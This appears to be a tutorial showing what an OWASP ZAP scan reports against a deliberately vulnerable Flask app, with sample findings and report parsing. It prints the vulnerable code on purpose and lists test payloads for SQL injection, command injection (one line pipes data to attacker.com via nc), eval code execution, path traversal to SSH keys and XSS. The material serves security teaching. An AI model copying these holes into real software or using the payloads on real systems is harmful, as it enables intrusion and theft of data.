# OWASP DAST - Practical Examples

## 📖 What DAST Will Find in Your App

Your Flask application has intentional vulnerabilities that DAST will detect:

---

## 1️⃣ SQL Injection Detection

### **Your Vulnerable Code:**
```python
@app.route("/user")
def get_user():
    user_id = request.args.get("id", "")
    query = "SELECT name FROM users WHERE id = " + user_id
    cur.execute(query)  # ← Vulnerable!
```

### **What DAST Tests:**
```
Endpoint: GET /user?id=<payload>

Test Payloads:
- /user?id=1' OR '1'='1
- /user?id=1; DROP TABLE users; --
- /user?id=1 UNION SELECT * FROM users

Expected Finding:
- Alert: "SQL Injection"
- Severity: High
- URL: http://localhost:5000/user?id=...
```

### **DAST Report Output:**
```json
{
  "name": "SQL Injection",
  "riskdesc": "High",
  "description": "SQL injection may be possible...",
  "uri": "http://localhost:5000/user",
  "method": "GET",
  "param": "id"
}
```

---

## 2️⃣ Command Injection Detection

### **Your Vulnerable Code:**
```python
@app.route("/run")
def run_cmd():
    cmd = request.args.get("cmd", "")
    result = subprocess.run(cmd, shell=True)  # ← Vulnerable!
```

### **What DAST Tests:**
```
Endpoint: GET /run?cmd=<payload>

Test Payloads:
- /run?cmd=ls; cat /etc/passwd
- /run?cmd=$(whoami)
- /run?cmd=echo test | nc attacker.com 4444

Expected Finding:
- Alert: "Command Injection"
- Severity: High
- URL: http://localhost:5000/run?cmd=...
```

---

## 3️⃣ Code Injection (eval) Detection

### **Your Vulnerable Code:**
```python
@app.route("/eval", methods=["POST"])
def do_eval():
    expr = request.form.get("expr", "")
    return str(eval(expr))  # ← Vulnerable!
```

### **What DAST Tests:**
```
Endpoint: POST /eval

Test Payloads:
- expr=__import__('os').system('whoami')
- expr=exec("import socket; s=socket.socket()...")
- expr=[x for x in ().__class__.__bases__[0].__subclasses__()...]

Expected Finding:
- Alert: "Code Injection / Remote Code Execution"
- Severity: Critical
- Type: POST parameter
```

---

## 4️⃣ Path Traversal Detection

### **Your Vulnerable Code:**
```python
@app.route("/upload", methods=["POST"])
def upload():
    filename = f.filename
    path = os.path.join("/tmp", filename)
    f.save(path)  # ← Vulnerable to path traversal!
```

### **What DAST Tests:**
```
Endpoint: POST /upload

Test Payloads:
- filename=../../etc/passwd
- filename=../../../root/.ssh/id_rsa
- filename=%2e%2e/etc/hosts

Expected Finding:
- Alert: "Path Traversal"
- Severity: High
- Description: Application allows directory traversal
```

---

## 5️⃣ Insecure Deserialization Detection

### **Your Vulnerable Code:**
```python
@app.route("/deserialize", methods=["POST"])
def deserialize():
    obj = pickle.loads(base64.b64decode(data))  # ← Vulnerable!
```

### **What DAST Tests:**
```
Endpoint: POST /deserialize

Test Payloads (base64 encoded pickle objects):
- Malicious pickle payloads
- RCE payload attempts
- Object injection payloads

Expected Finding:
- Alert: "Insecure Deserialization"
- Severity: Critical
- Type: Potential RCE vulnerability
```

---

## 6️⃣ Authentication Bypass Detection

### **Your Vulnerable Code:**
```python
@app.route("/login", methods=["POST"])
def login():
    if username == ADMIN_USER and password == ADMIN_PASS:
        return "Logged in"
```

### **What DAST Tests:**
```
Endpoint: POST /login

Test Payloads:
- username=admin&password=admin
- username=admin&password=password
- username=admin&password=' OR '1'='1

Expected Finding:
- Alert: "Hard-coded Credentials"
- Severity: High (if default creds work)
```

---

## 7️⃣ Cross-Site Scripting (XSS) Detection

### **Your Vulnerable Code:**
```python
@app.route("/")
def calculator():
    return render_template_string(HTML_TEMPLATE, result=result)
    # If result is not escaped: potential XSS
```

### **What DAST Tests:**
```
Endpoint: POST / (calculator form)

Test Payloads:
- num1=<script>alert('XSS')</script>
- num2=<img src=x onerror=alert(1)>
- operation=<svg onload=alert(1)>

Expected Finding:
- Alert: "Stored/Reflected XSS"
- Severity: Medium/High
```

---

## 📊 Complete DAST Scan Results Example

### **Sample GitHub Actions Output:**

```
==========================================
Starting OWASP ZAP Dynamic Security Scan
==========================================
Target: http://localhost:5000
Scan Type: Baseline (Fast)

✅ Flask app health check passed
✅ ZAP Docker image pulled
🔍 Starting scan on http://localhost:5000...

[SCANNING IN PROGRESS]
  - Discovered endpoints: 7
  - Testing GET /
  - Testing POST /
  - Testing GET /user
  - Testing POST /login
  - Testing GET /run
  - Testing POST /eval
  - Testing POST /upload
  - Testing POST /deserialize

📊 SCAN RESULTS
==========================================

Total Alerts Found: 15

📊 Vulnerabilities by Risk Level:
  🔴 High: 5
  🟠 Medium: 6
  🟡 Low: 3
  ℹ️  Informational: 1

Detected Issues:

1. SQL Injection
   Risk: High
   URL: http://localhost:5000/user?id=1' OR '1'='1
   Parameter: id
   
2. Command Injection  
   Risk: High
   URL: http://localhost:5000/run?cmd=ls;whoami
   Parameter: cmd
   
3. Code Injection (eval)
   Risk: High
   URL: http://localhost:5000/eval
   Parameter: expr
   
4. Path Traversal
   Risk: High
   URL: http://localhost:5000/upload
   Attack: ../../etc/passwd
   
5. Insecure Deserialization
   Risk: High
   URL: http://localhost:5000/deserialize
   Type: RCE Risk

6-15. Additional issues...

==========================================
✅ DAST scan completed successfully!
Reports generated:
  - zap_baseline_report.html (Download from artifacts)
  - zap_baseline_report.json
  - zap_baseline_report.xml
==========================================
```

---

## 🔍 Analyzing ZAP JSON Report

### **Sample zap_baseline_report.json Structure:**

```json
{
  "site": [
    {
      "@name": "http://localhost:5000",
      "alerts": [
        {
          "pluginid": "40016",
          "alertRef": "40016",
          "alert": "SQL Injection",
          "name": "SQL Injection",
          "riskcode": "3",
          "confidence": "3",
          "riskdesc": "High",
          "confidencedesc": "High",
          "description": "SQL injection may be possible...",
          "instances": [
            {
              "uri": "http://localhost:5000/user?id=1' OR '1'='1",
              "method": "GET",
              "param": "id",
              "attack": "' OR '1'='1",
              "evidence": "SELECT name FROM users WHERE id = ' OR '1'='1'"
            }
          ],
          "count": "1",
          "solution": "Use parameterized queries...",
          "reference": "https://owasp.org/..."
        }
      ]
    }
  ]
}
```

### **Parsing with Python:**

```python
import json

with open('zap_baseline_report.json', 'r') as f:
    data = json.load(f)

# Extract vulnerabilities
alerts = data['site'][0]['alerts']

print(f"Total Vulnerabilities: {len(alerts)}")

for alert in alerts:
    print(f"\n{alert['name']}")
    print(f"  Risk: {alert['riskdesc']}")
    print(f"  Confidence: {alert['confidencedesc']}")
    print(f"  Count: {alert['count']}")
    
    for instance in alert['instances']:
        print(f"  URL: {instance['uri']}")
        print(f"  Parameter: {instance['param']}")
        print(f"  Attack: {instance['attack']}")
```

---

## 🎯 ZAP Scan Endpoints Coverage

### **What Endpoints ZAP Will Test:**

| Endpoint | Method | Tests | Finding |
|----------|--------|-------|---------|
| `/` | GET | XSS, CSRF | Medium |
| `/` | POST | XSS, injection | Medium |
| `/login` | POST | Auth bypass, brute force | High |
| `/user` | GET | SQL injection, parameter tampering | High |
| `/run` | GET | Command injection, OS execution | High |
| `/eval` | POST | Code injection, eval abuse | Critical |
| `/upload` | POST | Path traversal, file upload attacks | High |
| `/deserialize` | POST | Insecure deserialization, RCE | Critical |

---

## 📝 Viewing ZAP HTML Report

### **Step 1: Download Report**
```
GitHub Actions
  → Workflow Run
  → dast job
  → "Upload ZAP Scan Reports" artifact
  → Download zap-scan-reports
  → Extract zap_baseline_report.html
```

### **Step 2: Open in Browser**
```bash
open zap_baseline_report.html
# or
firefox zap_baseline_report.html
```

### **Step 3: HTML Report Contents**
```
📄 ZAP Baseline Report

Summary
├─ Scan Date: YYYY-MM-DD
├─ Total Alerts: 15
└─ High Risk: 5

Vulnerabilities by Risk
├─ 🔴 High (5)
├─ 🟠 Medium (6)
└─ 🟡 Low (3)

Detailed Findings
├─ Alert: SQL Injection
│  ├─ Risk: High
│  ├─ Evidence: [code snippet]
│  └─ Solution: [remediation steps]
├─ Alert: Command Injection
│  └─ ...
└─ [More alerts...]
```

---

## 🚀 Running DAST Locally vs CI/CD

### **Local Testing:**

```bash
# 1. Start app
python app.py &
sleep 3

# 2. Run ZAP
docker run --rm --network host \
  -v $(pwd):/zap/wrk \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t http://localhost:5000 \
  -r report.html

# 3. View report
open report.html

# 4. Stop app
pkill -f "python app.py"
```

### **CI/CD (GitHub Actions):**

```yaml
# Automated in workflow
# No manual steps needed
# Reports as artifacts
# Integrated with GitHub
```

---

## 💾 Report Formats Explained

### **1. HTML Report (zap_baseline_report.html)**
- **Purpose:** Visual review
- **Best for:** Security teams, stakeholders
- **Usage:** Open in web browser
- **Info:** Summary + detailed findings + evidence

### **2. JSON Report (zap_baseline_report.json)**
- **Purpose:** Programmatic processing
- **Best for:** Automation, integration
- **Usage:** Parse with Python/JavaScript
- **Info:** Structured data, all details

### **3. XML Report (zap_baseline_report.xml)**
- **Purpose:** Tool integration
- **Best for:** SonarQube, other tools
- **Usage:** Import to other security tools
- **Info:** Hierarchical structure

---

## ✅ Next Steps

1. **Push to GitHub** with mainv2.yml
2. **Trigger Workflow** manually or via push
3. **Wait for DAST Job** (2-3 minutes)
4. **Download Reports** from artifacts
5. **Analyze Findings** (HTML or JSON)
6. **Fix Issues** based on recommendations
7. **Re-run Scan** to verify fixes

Your DAST pipeline is ready! 🎉
